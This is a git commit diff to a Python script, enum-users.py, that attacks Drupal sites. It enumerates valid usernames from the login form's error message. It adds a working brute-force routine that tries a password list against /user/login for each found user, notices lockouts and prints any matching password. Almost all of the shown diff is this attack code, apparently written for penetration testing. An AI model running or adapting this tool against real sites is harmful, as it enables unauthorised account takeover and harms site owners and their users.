056456c17d08a71be21ef48eb95151eaf8fdb883
Jens Timmerman <jens.timmerman@mazars.be>
2018-10-11 14:00:12 +0200

    added tests and bruteforce

--- enum-users.py
+++ enum-users.py
@@ -36,12 +36,44 @@ def wordlist(options):
         # send request
         data = {'form_build_id': form_build_id, 'form_id': form_id, 'op': op, 'name': username}
         req = requests.post(url, data=data)
-        if ('is not recognized as a user name or an e-mail address.' in req.content):
+        if ('is not recognized as a user name or an e-mail address.' in str(req.content)):
             logging.debug("Username '%s' does not exist", username)
         else:
             print("[!] Username '%s' exists" % username)
             found.append(username)
-        return found
+    return found
+
+def brute(options, usernamelist):
+    url = "%s/user/login" % options.url
+    with open(options.pwlist) as f:
+        passwords = f.readlines()
+
+    for username in usernamelist:
+        logging.info("bruteforcing %s", username)
+        for password in passwords:
+            password = password.rstrip()
+            req = requests.get(url)
+            soup = BeautifulSoup(req.content)
+            # get form
+            form = soup.find('form', attrs={'id': 'user-login'})
+            form_build_id = form.find('input', attrs={'name': 'form_build_id'})['value']
+            form_id = form.find('input', attrs={'name': 'form_id'})['value']
+            op = form.find('input', attrs={'name': 'op'})['value']
+            # send request
+            data = {'form_build_id': form_build_id, 'form_id': form_id, 'op': op, 'name': username,
+                    'pass': password}
+            req = requests.post(url, data=data)
+            if ('/user/password?name=%s' % username in str(req.content)):
+                logging.debug("bad pw %s", password)
+                logging.debug('content: %s', str(req.content))
+            elif ('/user/password' in str(req.content)):
+                logging.debug("to many tries for user %s", username)
+                break
+            else:
+                logging.debug('pw found, content: %s', str(req.content))
+                print("[!] Username '%s' has pw '%s'" % (username, password))
+                break
+
 
 def auto(options):
     # url to target
@@ -60,16 +92,12 @@ def auto(options):
     return found
 
 
-def brute(pwlist, usernamelist):
-    pass
-
-
 def main():
     parser = OptionParser()
     parser.add_option("-u", "--url", dest="url", help="URL of the Drupal install", default=None)
     parser.add_option("-n", "--namelist", dest="wordlist", help="list of usernames you want to try", default=None)
-    parser.add_option("-p", "--pwlist", dest="pwlist", help="list of passwords you want to try with bruteforce on found
-                      users", default=None)
+    parser.add_option("-p", "--pwlist", dest="pwlist", help="list of passwords you want to try with bruteforce",
+                      default=None)
     parser.add_option("-a", "--auto", action="store_true", dest="auto", help="Automatic method to enumerate users",
                       default=None)
     parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Verbose mode")
@@ -77,7 +105,8 @@ def main():
     options, _ = parser.parse_args()
 
     if options.verbose:
-        logging.setloglevel(logging.DEBUG)
+        logging.getLogger().setLevel(logging.DEBUG)
+
 
     if not options.url or (not options.wordlist and not options.auto):
         print(parser.print_help())
@@ -85,11 +114,11 @@ def main():
 
     found = []
     if options.wordlist:
-        found.append(wordlist(options))
+        found.extend(wordlist(options))
     if options.auto:
-        found.append(auto(options))
+        found.extend(auto(options))
     if options.pwlist:
-        brute(options.pwlist, found)
+        brute(options, found)
 
 
 if __name__ == '__main__':
